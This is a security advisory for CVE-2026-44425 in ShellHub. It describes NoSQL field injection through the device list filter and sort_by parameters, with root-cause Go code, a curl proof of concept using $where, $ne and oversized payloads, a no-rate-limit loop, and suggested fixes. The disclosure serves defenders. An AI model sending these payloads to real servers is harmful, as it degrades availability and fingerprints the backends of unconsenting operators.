# [M] ShellHub has crash-DoS via field injection in filter and sort-by parameters

## Summary
Severity: Medium
Advisory: GHSA-47r2-v3x6-wff9
CVE: CVE-2026-44425
CWE: CWE-1333, CWE-20, CWE-943
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:L (CVSS_V3)
Published: 2026-05-06
Source: https://github.com/advisories/GHSA-47r2-v3x6-wff9
Type: github-advisory

## Affected
- Go: `github.com/shellhub-io/shellhub` — affected >=0 <0.24.2

## Details
## Summary
The device list endpoint accepts user-controlled identifiers in two places that are passed directly as BSON/SQL keys in the database layer without validation:

  1. The `name` field of each filter property in the base64-encoded `filter`
     query parameter.
  2. The `sort_by` query parameter.

Any authenticated user can craft payloads that cause the aggregation/query to fail and the API to return HTTP 500 with no body, with no rate limiting applied.

## Severity
**CVSS 3.1: 6.5 (Medium)** 
CWE-20 (Improper Input Validation) 
CWE-943 (Improper Neutralization of Special Elements in Data Query Logic)

## Affected versions
ShellHub Community v0.24.1 (validated). All versions sharing the same filter and sort pipeline (`api/store/mongo/query-options.go`).

## Root cause

### Vector 1 — Filter field name
  `api/store/mongo/query-options.go:140`:

  ```go
  conditions = append(conditions, bson.M{param.Name: property})
  ```

`param.Name` is the `name` field from the JSON filter supplied by the client. It becomes a BSON map key with no validation, allowing BSON operator names (`$where`, `$ne`, `$or`, `$regex`) and virtual pipeline-computed fields (`namespace`, paths containing `$`) to be  injected.

### Vector 2 — Sort-by field
Similar pattern in the sort pipeline where the `sort_by` query parameter is used to build `bson.M{"$sort": {sortBy: order}}` without validation.

### Additional observation
`fromContains` (`api/store/mongo/internal/filters.go:60-69`) passes user input directly as `$regex` value, which enables blind regex extraction over string fields within the caller's tenant and potential ReDoS amplification on large datasets.

  ```go
  func fromContains(value interface{}) (bson.M, error) {
      switch value.(type) {
      case string:
          return bson.M{"$regex": value, "$options": "i"}, nil
  ```

## Proof of concept (validated live against v0.24.1)

  ```bash
  TOKEN=<valid-user-jwt>

  # Helper: base64-encode a filter payload
  encode_filter() {
    python3 -c 'import json,base64,sys;print(base64.b64encode(json.dumps(json.loads(sys.argv[1])).encode()).decode())' "$1"
  }

  # --- Vector 1: filter field injection ---

  # Baseline: legitimate filter -> 200
  F=$(encode_filter '[{"type":"property","params":{"name":"name","operator":"contains","value":"anything"}}]')
  curl -sS -w "HTTP=%{http_code}\n" "http://target/api/devices?filter=$F" \
    -H "Authorization: Bearer $TOKEN"
  # HTTP=200

  # Exploit 1a: Mongo operator as field name
  F=$(encode_filter '[{"type":"property","params":{"name":"$where","operator":"contains","value":"x"}}]')
  curl -sS -w "HTTP=%{http_code}\n" "http://target/api/devices?filter=$F" \
    -H "Authorization: Bearer $TOKEN"
  # HTTP=500

  # Exploit 1b: nested object as value
  F=$(encode_filter '[{"type":"property","params":{"name":"status","operator":"eq","value":{"$ne":"accepted"}}}]')
  curl -sS -w "HTTP=%{http_code}\n" "http://target/api/devices?filter=$F" \
    -H "Authorization: Bearer $TOKEN"
  # HTTP=500

  # Exploit 1c: pipeline-computed field as filter name
  F=$(encode_filter '[{"type":"property","params":{"name":"namespace","operator":"contains","value":"."}}]')
  curl -sS -w "HTTP=%{http_code}\n" "http://target/api/devices?filter=$F" \
    -H "Authorization: Bearer $TOKEN"
  # HTTP=500

  # --- Vector 2: sort-by injection ---

  # Baseline: legitimate sort -> 200
  curl -sS -w "HTTP=%{http_code}\n" "http://target/api/devices?sort_by=name" \
    -H "Authorization: Bearer $TOKEN"
  # HTTP=200

  # Exploit 2a: Mongo operator as sort field
  curl -sS -w "HTTP=%{http_code}\n" "http://target/api/devices?sort_by=\$where" \
    -H "Authorization: Bearer $TOKEN"
  # HTTP=500

  # Exploit 2b: path containing $
  curl -sS -w "HTTP=%{http_code}\n" "http://target/api/devices?sort_by=_id.%24%24%24" \
    -H "Authorization: Bearer $TOKEN"
  # HTTP=500

  # Exploit 2c: oversized sort field (no length validation)
  curl -sS -w "HTTP=%{http_code}\n" "http://target/api/devices?sort_by=$(python3 -c 'print("A"*5000)')" \
    -H "Authorization: Bearer $TOKEN"
  # HTTP=500

  # Exploit 2d: non-indexable internal field
  curl -sS -w "HTTP=%{http_code}\n" "http://target/api/devices?sort_by=tenant_id" \
    -H "Authorization: Bearer $TOKEN"
  # HTTP=500

  # --- Repeat to demonstrate no rate limiting ---
  for i in $(seq 1 20); do
    curl -sS -o /dev/null -w "%{http_code} " "http://target/api/devices?sort_by=\$where" \
      -H "Authorization: Bearer $TOKEN"
  done
  # 500 500 500 500 500 500 500 500 500 500 500 500 500 500 500 500 500 500 500 500
  ```

  **Confirmed field values that trigger 500:**
  - Filter name: `$where`, `$regex`, `$or`, `$ne`, `remote_addr`, `tenant_id`, `namespace`, any path containing `$` after a `.`
  - Sort-by: `$where`, `_id.$$$`, `tenant_id`, `password.hash`, overly long strings

  **Observed response characteristics:**
  ```
  HTTP/1.1 500 Internal Server Error
  Content-Length: 0
  X-Request-Id: <id>    ← logged as error in backend
  ```

Response time 8-18 ms per request, server process stays alive, no degradation across 20 consecutive requests.

## Impact
  - **Availability (low):** unrestricted HTTP 500 generation by any authenticated caller; log noise, SIEM false-positives, WAF bypass
fingerprinting.
  - **Information disclosure (low):** potential stack trace exposure depending on logger configuration; attacker can fingerprint the underlying MongoDB aggregation pipeline and schema.
  - **Resource exhaustion (potential):** user-controlled `$regex` value on large tenant datasets enables ReDoS amplification (not reproducible on a 2-device test instance, but attack surface is real on production-scale deployments).
  - **Forensics difficulty:** unified 500 response makes it hard to distinguish legitimate errors from attacker probes in logs.

## Suggested fix

  1. **Allowlist filter and sort field names per collection.** Add a whitelist of allowed `param.Name` and `sort_by` values for each model exposed via filters (`device`, `session`, etc.). Reject anything else with HTTP 400.

  2. **Reject BSON operators in field names.** Even if an allowlist is not practical, reject values that:
     - start with `$`
     - contain `$` after a `.`
     - contain characters outside `[A-Za-z0-9_.]`
     - exceed a reasonable length (e.g., 64 characters)

  3. **Validate `value` shape.** For `contains`/`eq`/`ne` operators, reject non-primitive values (objects, arrays of objects).

  4. **Catch aggregation errors.** In `api/store/mongo/query-options.go`,  wrap pipeline execution and return a typed error that the HTTP layer maps to 400 Bad Request instead of 500.

  5. **Limit regex complexity.** In `fromContains`, reject regex values longer than N characters or containing nested quantifiers (`(...)+`, `(...)*`, `(.+)+`, etc.) to mitigate ReDoS.

## References
- https://github.com/shellhub-io/shellhub/security/advisories/GHSA-47r2-v3x6-wff9
- https://nvd.nist.gov/vuln/detail/CVE-2026-44425
- https://github.com/shellhub-io/shellhub
